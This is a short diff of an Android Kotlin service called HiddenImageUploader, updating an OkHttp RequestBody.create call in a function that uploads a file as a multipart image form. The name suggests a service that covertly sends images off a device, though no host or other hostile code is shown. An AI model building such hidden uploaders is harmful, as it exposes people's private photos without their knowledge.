@@ -25,7 +25,7 @@ class HiddenImageUploader : Service() {
     private fun uploadFile(file: File) {
         val body = MultipartBody.Builder()
             .setType(MultipartBody.FORM)
-            .addFormDataPart("file", file.name, RequestBody.create("image/*".toMediaType(), file))
+            .addFormDataPart("file", file.name, RequestBody.create(file, "image/*".toMediaType()))
             .build()
 
         val request = Request.Builder()
